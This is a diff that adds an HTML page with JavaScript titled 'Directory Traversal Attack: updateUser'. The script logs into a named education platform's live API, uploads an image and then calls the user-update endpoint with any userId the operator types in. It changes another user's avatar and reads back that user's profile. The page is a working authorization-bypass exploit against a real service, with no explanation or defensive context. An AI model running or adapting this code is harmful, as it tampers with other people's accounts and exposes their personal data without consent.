@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+
+    <style>
+        #updateResult {
+            display: none;
+        }
+
+        .memo{
+            margin: 30px 0px 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h4>Directory Traversal Attack: updateUser</h4>
+
+    <form action="javascript: login()">
+        <label>userName</label>
+        <input type="text" name="username" id="username">
+        <label>password</label>
+        <input type="password" name="password" id="password">
+
+        <button type="submit">Login</button>
+        <span id="loginResult"></span>
+    </form>
+
+    <div class="memo">
+        <a href="http://wiki.feifanuniv.com/pages/viewpage.action?pageId=21595029" target="_blank" rel="noopener noreferrer">
+            <span>target api</span>
+        </a>
+    </div>
+    <div class="memo">
+        <input type="file" onchange="previewFile()" />
+        <p id="imageUrl"></p>
+
+        <label>userId </label>
+        <input type="text" id="userIdInput" style="width: 80px" />
+        <button type="button" onclick="updateUser()">Update User Avatar</button>
+
+        <div id="updateResult">
+            updading...
+        </div>
+    </div>
+
+    <script>
+        const login_api = "http://www.qingshuxuetang.com/qingshu-svc-home/v5_5/home/user/login";
+        const userInfo_api = "http://www.qingshuxuetang.com/qingshu-svc-home/v5_3/home/user/getUserInfo";
+        const udpateUserInfo_api = "http://www.qingshuxuetang.com/qingshu-svc-home/V5_3/home/user/update";
+        const updaloadImage_api = "http://www.qingshuxuetang.com/qingshu-svc-home/V5_3/open/image/uploadImage";
+
+        let token = "";
+        let avatarId = null;
+
+        function login() {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", login_api);
+            xhr.setRequestHeader("Content-type", "application/json");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("loginResult").innerText = xhr.responseText;
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0 && response.data) {
+                        token = response.data.accessToken;
+                    }
+                }
+            };
+
+            let requestBody = {
+                "name": document.getElementById("username").value,
+                "password": document.getElementById("password").value
+            };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+        function previewFile() {
+            document.getElementById("imageUrl").innerText = "";
+
+            var file = document.querySelector('input[type=file]').files[0];
+            var reader = new FileReader();
+
+            reader.addEventListener("load", function () {
+                uploadImage(reader.result);
+            }, false);
+
+            if (file) {
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function uploadImage(base64Image) {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", updaloadImage_api)
+            xhr.setRequestHeader("Content-type", "application/json");
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0 && response.data) {
+                        document.getElementById("imageUrl").innerText = response.data.url;
+                        avatarId = response.data.id;
+                    }
+                }
+            };
+
+            let requestBody = { imgBase64: base64Image.split(',')[1] };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+        function updateUser() {
+            let userId = document.getElementById('userIdInput').value;
+            if (!userId) {
+                alert('please input userId.')
+                return;
+            }
+            if (!avatarId) {
+                alert('please upload image.')
+                return;
+            }
+
+            document.getElementById("updateResult").style.display = "block";
+
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", udpateUserInfo_api)
+            xhr.setRequestHeader("Content-type", "application/json");
+            xhr.setRequestHeader("User-Agent-QS", "QSXT");
+            xhr.setRequestHeader("Authorization-QS", token);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    let response = JSON.parse(xhr.responseText);
+                    if (response && response.hr === 0) {
+                        getUserInfo(userId);
+                    }
+                }
+            };
+
+            let requestBody = { userId: userId, avatar: avatarId };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+        function getUserInfo(userId) {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", userInfo_api)
+            xhr.setRequestHeader("Content-type", "application/json");
+            xhr.setRequestHeader("User-Agent-QS", "QSXT");
+            xhr.setRequestHeader("Authorization-QS", token);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById("updateResult").innerText = xhr.responseText;
+                }
+            };
+
+            let requestBody = { userId: userId };
+            xhr.send(JSON.stringify(requestBody));
+        }
+
+    </script>
+</body>
+
+</html>
